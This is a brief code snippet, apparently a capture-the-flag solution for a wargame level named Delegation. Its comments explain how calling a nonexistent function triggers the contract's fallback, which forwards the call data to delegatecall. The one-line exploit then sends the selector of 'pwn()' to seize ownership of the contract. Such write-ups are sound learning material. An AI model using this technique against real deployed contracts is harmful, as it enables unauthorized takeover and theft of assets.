
//By running this line of code in the developer console
//the Delegation contract is called with a non-existant function signature
//this triggers the fallback() where the msg.data is passed to the delegatecall

await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
